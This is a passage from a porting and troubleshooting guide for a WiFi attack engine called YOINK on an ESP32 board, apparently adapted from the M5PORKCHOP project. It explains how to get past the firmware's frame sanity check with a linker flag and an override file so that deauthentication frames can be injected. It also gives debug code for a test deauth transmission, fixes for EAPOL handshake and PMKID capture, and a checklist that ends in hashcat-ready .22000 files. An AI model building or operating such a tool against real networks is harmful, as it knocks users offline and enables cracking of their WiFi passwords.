    uint8_t  getHandshakeCount();     // Complete handshakes
    uint8_t  getPmkidCount();
    uint8_t  getCurrentChannel();
    
    // Target info
    const char* getTargetSSID();
    const uint8_t* getTargetBSSID();
    int8_t  getTargetRSSI();
    uint8_t getEapolMask();           // Current target's EAPOL progress
    
    // Network list access (for UI)
    uint8_t getNetworkListCount();
    const YoinkNetwork* getNetwork(uint8_t index);
    
    // Handshake list (for UI)
    const YoinkHandshake* getHandshake(uint8_t index);
    const YoinkPmkid* getPmkid(uint8_t index);
}
```

### 5.3 platformio.ini Changes

```ini
build_src_filter = +<*> -<yoink.cpp>  ; Keep excluding old file

build_flags =
  -DTOUCH_CS=33
  -DUSER_SETUP_LOADED=1
  -include include/User_Setup.h
  -DARDUINO_LOOP_STACK_SIZE=16384
  -Wl,-zmuldefs                       ; ← ADD THIS LINE
```

### 5.4 Integration into main.cpp

In your main loop's YOINK auto-mode handler, replace the current `yoinkModeTick()` with:

```cpp
// In setup() or when entering YOINK mode:
YoinkEngine::init();
YoinkEngine::start();

// In loop() when autoMode == AutoMode::Y0INK:
YoinkEngine::update();

// When drawing YOINK screen:
drawYoinkScreen();  // Uses YoinkEngine getters

// When exiting YOINK:
YoinkEngine::stop();
```

---

## 6. Troubleshooting & Final Checks

### 6.1 Common Pitfalls

| Issue | Cause | Fix |
|-------|-------|-----|
| `esp_wifi_80211_tx` returns `ESP_ERR_WIFI_IF` | Using wrong interface | Use `WIFI_IF_STA` with WSL bypass |
| Deauth frames silently dropped | Missing `-zmuldefs` linker flag | Add `-Wl,-zmuldefs` to `build_flags` |
| No packets received | Promiscuous filter set wrong | Use `esp_wifi_set_promiscuous_filter(nullptr)` |
| EAPOL never captured | Wrong data frame offset | Check QoS (+2) and HTC (+4) offset adjustments |
| Crash in callback | Heap allocation in WiFi task | Use static buffers / deferred events |
| SD write corruption | SPI bus contention | Pause promiscuous before SD writes |
| Stack overflow | Large local arrays in callback | Use static/global buffers |
| BLE interference | Coexistence | Deinit BLE before WiFi promiscuous |
| Handshake never completes | Channel hopping during capture | Lock channel when target selected |
| .22000 file "invalid" in hashcat | MIC not zeroed in EAPOL copy | Zero bytes 81-96 before hex encoding |

### 6.2 Diagnostic Debug Prints

Add these to verify each subsystem:

```cpp
// 1. Verify WSL bypass is active (add to setup())
Serial.println("[WSL] Frame sanity check bypass loaded (-zmuldefs)");

// 2. Verify injection works (test deauth)
uint8_t testBssid[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
uint8_t testDest[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, testDeauthFrame, 26, false);
Serial.printf("[YOINK] Test TX result: %s (%d)\n", 
              r == ESP_OK ? "SUCCESS" : "FAIL", r);

// 3. In promiscuous callback - verify packets arriving
static uint32_t lastPktLog = 0;
if (millis() - lastPktLog > 3000) {
    Serial.printf("[YOINK-CB] pkts=%u ch=%d type=%d\n", pktCount, ch, type);
    lastPktLog = millis();
}

// 4. EAPOL detection confirmation
Serial.printf("[YOINK] EAPOL M%d captured! BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
              messageNum, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

// 5. File save verification
Serial.printf("[YOINK] Saved %s (%d bytes)\n", filename, f.size());

// 6. Heap monitoring (critical for CYD's tight memory)
Serial.printf("[YOINK] Heap: free=%u largest=%u nets=%d hs=%d\n",
              ESP.getFreeHeap(), 
              heap_caps_get_largest_free_block(MALLOC_CAP_8BIT),
              netCount, hsCount);
```

### 6.3 Verification Checklist

- [ ] `-Wl,-zmuldefs` in `platformio.ini`
- [ ] `wsl_bypasser.cpp` compiled (not excluded in `build_src_filter`)
- [ ] `esp_wifi_80211_tx(WIFI_IF_STA, ...)` returns `ESP_OK` in serial log
- [ ] Promiscuous callback firing (packet count increasing)
- [ ] EAPOL M1 seen after deauth burst (in serial log)
- [ ] M1+M2 pair captured for a test network
- [ ] `.pcap` file opens in Wireshark without errors
- [ ] `.22000` file accepted by `hashcat --show -m 22000 capture.22000`
- [ ] SD card directory `/m5porkchop/handshakes/` created correctly
- [ ] Heap stays above 30KB after 5 minutes of operation
- [ ] No WDT resets during SD writes (yield/delay between saves)

### 6.4 Memory Budget for CYD

```
Available SRAM: ~280KB usable (after WiFi/BLE stack)
WiFi promiscuous buffers: ~40KB (managed by ESP-IDF)
TFT_eSPI frame buffer: ~0KB (no sprites in your code)
Network tracking (64 nets × 100B): ~6.4KB
Handshake storage (10 × 3.5KB): ~35KB
PMKID storage (10 × 60B): ~0.6KB
Client table (20 × 14B): ~0.3KB
PCAP write buffer (static 600B): ~0.6KB
Beacon capture (static 512B): ~0.5KB
────────────────────────────────────────
Total YOINK overhead: ~43KB
Remaining for stack/heap: ~190KB+
```

This is well within the CYD's capabilities. The key reductions vs. OINK:
- 64 networks (not 200) — saves ~13KB
- 10 handshakes (not 50) — saves ~140KB
- Static beacon buffer (not malloc'd per-handshake) — saves fragmentation
- No PendingHandshake circular buffer (~13KB saved) — use simpler approach

---

## Summary: Critical Path to Working Injection

1. **Add `-Wl,-zmuldefs` to `platformio.ini` `build_flags`** ← This is the single fix
2. **Create `wsl_bypasser.cpp`** with the `ieee80211_raw_frame_sanity_check` override
3. **Change WiFi init to `WIFI_STA` + promiscuous** (remove the hidden AP)
4. **Use `WIFI_IF_STA` for all `esp_wifi_80211_tx()` calls**
5. **Remove `tryAlternateTx()` and all the toggle/retry logic** — it's no longer needed

Everything else (EAPOL parsing, .22000 format, PCAP writing) in M5PORKCHOP's code is already
correct and can be ported directly. The injection failure was purely the missing `-zmuldefs`
flag preventing the ESP32 from transmitting management frames.
